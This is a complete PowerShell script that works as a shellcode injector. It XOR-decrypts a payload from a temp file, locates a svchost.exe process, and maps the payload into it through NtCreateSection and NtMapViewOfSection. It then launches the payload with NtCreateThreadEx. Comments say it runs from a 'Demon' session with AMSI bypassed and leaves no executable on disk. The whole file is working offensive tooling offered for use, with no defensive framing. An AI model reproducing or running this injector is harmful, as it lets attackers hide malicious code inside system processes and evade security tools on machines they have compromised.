# ps_inject.ps1 — SYSTEM shellcode injector via NtCreateSection+NtMapViewOfSection
# Run via Demon powershell (AMSI bypassed in-process). No EXE on disk.
$dat_path = 'C:\Windows\Temp\svc4.dat'
$key = [byte[]]@(0x00,0x68,0x60,0x8d,0xb8,0xd6,0x5a,0xca,0xf0,0xae,0x0e,0x4f,0x94,0x67,0xb4,0x30,0xd9,0x88,0x31,0x87,0x50,0x59,0x0b,0xd7,0xb5,0x0e,0xe8,0xa0,0xf2,0xd4,0xf8,0x84)
$dat = [IO.File]::ReadAllBytes($dat_path)
for ($i = 0; $i -lt $dat.Length; $i++) { $dat[$i] = $dat[$i] -bxor $key[$i % 32] }

Add-Type -Name NtInj -Namespace '' -MemberDefinition @'
using System;
using System.Runtime.InteropServices;

[StructLayout(LayoutKind.Sequential)]
public struct OBJ_ATTR {
    public int Length; public IntPtr Root; public IntPtr Name;
    public int Attr; public IntPtr Sec; public IntPtr QoS;
}
[StructLayout(LayoutKind.Sequential)]
public struct CLI_ID { public IntPtr Proc; public IntPtr Thread; }

[DllImport("ntdll.dll")] public static extern int NtQuerySystemInformation(
    uint cl, IntPtr buf, uint sz, ref uint ret);
[DllImport("ntdll.dll")] public static extern int NtOpenProcess(
    ref IntPtr h, uint acc, ref OBJ_ATTR oa, ref CLI_ID cid);
[DllImport("ntdll.dll")] public static extern int NtCreateSection(
    ref IntPtr h, uint acc, IntPtr oa, ref long sz, uint pp, uint sa, IntPtr fh);
[DllImport("ntdll.dll")] public static extern int NtMapViewOfSection(
    IntPtr sec, IntPtr proc, ref IntPtr base_addr, ulong zb, ulong cs,
    IntPtr off, ref ulong vsz, int inh, uint at, uint pp);
[DllImport("ntdll.dll")] public static extern int NtUnmapViewOfSection(
    IntPtr proc, IntPtr base_addr);
[DllImport("ntdll.dll")] public static extern int NtCreateThreadEx(
    ref IntPtr h, uint acc, IntPtr oa, IntPtr proc, IntPtr start,
    IntPtr arg, uint fl, ulong zb, ulong ss, ulong ms, IntPtr al);
[DllImport("ntdll.dll")] public static extern int NtClose(IntPtr h);
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(
    IntPtr a, uint s, uint t, uint p);
[DllImport("kernel32.dll")] public static extern bool VirtualFree(
    IntPtr a, uint s, uint t);
'@ -EA 0

# Find svchost.exe PID via NtQuerySystemInformation(SystemProcessInformation=5)
$bufSz = 4MB
$buf = [NtInj]::VirtualAlloc([IntPtr]::Zero, $bufSz, 0x3000, 0x04)
$retlen = [uint32]0
[NtInj]::NtQuerySystemInformation(5, $buf, $bufSz, [ref]$retlen) | Out-Null

$p = $buf
$svc_pid = [uint32]0
while ($true) {
    $next  = [Runtime.InteropServices.Marshal]::ReadInt32($p, 0x00)
    $nbuf  = [Runtime.InteropServices.Marshal]::ReadIntPtr($p, 0x40)  # ImageName.Buffer
    $epid  = [Runtime.InteropServices.Marshal]::ReadInt32($p, 0x50)   # UniqueProcessId
    if ($nbuf -ne [IntPtr]::Zero -and $epid -gt 4) {
        $nm = [Runtime.InteropServices.Marshal]::PtrToStringUni($nbuf)
        if ($nm -eq 'svchost.exe') { $svc_pid = [uint32]$epid; break }
    }
    if ($next -eq 0) { break }
    $p = [IntPtr]($p.ToInt64() + $next)
}
[NtInj]::VirtualFree($buf, 0, 0x8000) | Out-Null

if ($svc_pid -eq 0) { Write-Host '[!] svchost not found'; return }
Write-Host ("[*] Target PID: " + $svc_pid)

# Open svchost process
$hProc = [IntPtr]::Zero
$oa = [NtInj+OBJ_ATTR]::new(); $oa.Length = 48
$cid = [NtInj+CLI_ID]::new(); $cid.Proc = [IntPtr]$svc_pid
$r = [NtInj]::NtOpenProcess([ref]$hProc, 0x1FFFFF, [ref]$oa, [ref]$cid)
if ($r -ne 0 -or $hProc -eq [IntPtr]::Zero) { Write-Host ('[!] NtOpenProcess: 0x' + $r.ToString('X8')); return }

# Create anonymous section (PAGE_EXECUTE_READWRITE, SEC_COMMIT)
$hSec = [IntPtr]::Zero
$sec_sz = [long]$dat.Length
$r = [NtInj]::NtCreateSection([ref]$hSec, 0xF001F, [IntPtr]::Zero, [ref]$sec_sz, 0x40, 0x8000000, [IntPtr]::Zero)
if ($r -ne 0) { Write-Host ('[!] NtCreateSection: 0x' + $r.ToString('X8')); [NtInj]::NtClose($hProc); return }

# Map locally (PAGE_READWRITE), copy payload, unmap
$curProc = [IntPtr]::new(-1)
$lmap = [IntPtr]::Zero; $lsz = [ulong]0
[NtInj]::NtMapViewOfSection($hSec, $curProc, [ref]$lmap, 0, 0, [IntPtr]::Zero, [ref]$lsz, 2, 0, 0x04) | Out-Null
[Runtime.InteropServices.Marshal]::Copy($dat, 0, $lmap, $dat.Length)
[NtInj]::NtUnmapViewOfSection($curProc, $lmap) | Out-Null

# Map into svchost (PAGE_EXECUTE_READ)
$rmap = [IntPtr]::Zero; $rsz = [ulong]0
$r = [NtInj]::NtMapViewOfSection($hSec, $hProc, [ref]$rmap, 0, 0, [IntPtr]::Zero, [ref]$rsz, 2, 0, 0x20)
[NtInj]::NtClose($hSec) | Out-Null
if ($r -ne 0) { Write-Host ('[!] NtMapViewOfSection remote: 0x' + $r.ToString('X8')); [NtInj]::NtClose($hProc); return }

# Create remote thread at shellcode base
$hThr = [IntPtr]::Zero
[NtInj]::NtCreateThreadEx([ref]$hThr, 0x1FFFFF, [IntPtr]::Zero, $hProc, $rmap, [IntPtr]::Zero, 0, 0, 0, 0, [IntPtr]::Zero) | Out-Null
[NtInj]::NtClose($hThr) | Out-Null
[NtInj]::NtClose($hProc) | Out-Null

Write-Host ("[+] Injected into svchost PID " + $svc_pid)
